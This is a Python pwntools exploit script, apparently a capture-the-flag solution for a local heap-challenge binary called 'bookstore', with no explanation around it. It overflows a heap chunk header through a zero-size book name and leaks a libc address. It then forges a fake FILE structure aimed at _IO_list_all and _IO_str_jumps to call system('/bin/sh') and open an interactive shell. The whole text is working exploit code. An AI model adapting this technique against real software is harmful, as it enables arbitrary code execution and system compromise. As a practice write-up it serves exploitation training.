from pwn import *

context.log_level='debug'
p = process('./bookstore')
libc = ELF('./libc.so')

def add(author,size,cont):
    p.recvuntil('Your choice:')
    p.sendline('1')
    p.recvuntil('What is the author name?')
    p.sendline(author)
    p.recvuntil('How long is the book name?')
    p.sendline(str(size))
    p.recvuntil('What is the name of the book?')
    p.sendline(cont)
def delete(idx):
    p.recvuntil('Your choice:')
    p.sendline('2')
    p.recvuntil('?')
    p.sendline(str(idx))
def show(idx):
    p.recvuntil('Your choice:')
    p.sendline('3')
    p.recvuntil('?')
    p.sendline(str(idx))

add('a'*0x10,0,'0'*0x10)#0
add('b'*0x10,0x40,'1'*0x10)#1
add('c'*0x10,0x40,'2'*0x10)#2
add('d'*0x10,0x40,'3'*0x10)#3
delete(0)
add('a'*0x10,0,'0'*0x18+p64(0xa1))#0
delete(1)

add('b'*0x10,0,'1')
show(1)
p.recvuntil('Bookname:')
data = u64(p.recv(6).ljust(8,'\x00'))
libc_base = data - 0x3c4c31
log.success('libc_base :'+hex(libc_base))
bin_addr = libc_base + libc.search('/bin/sh').next()
system_addr = libc_base + libc.symbols['system']
io_list_all = libc_base + libc.symbols['_IO_list_all']
io_str_jump = libc_base + libc.symbols['_IO_file_jumps'] + 0xC0
#print hex(sh)

fire = p64(0) + p64(0x61) + p64(io_list_all-0x10)*2
fire += p64(0)+p64(1)+p64(0)+p64(bin_addr)+p64(0)*19+p64(io_str_jump-8)
fire = fire.ljust(0xe8,'\x00')
fire += p64(system_addr)

add('e',0,'\x00'*0x10+fire)#4
gdb.attach(p)

p.recvuntil('Your choice:')
p.sendline('1')
p.recvuntil('What is the author name?')
p.sendline('1')
p.recvuntil('book name?')
p.sendline('1')

p.interactive()
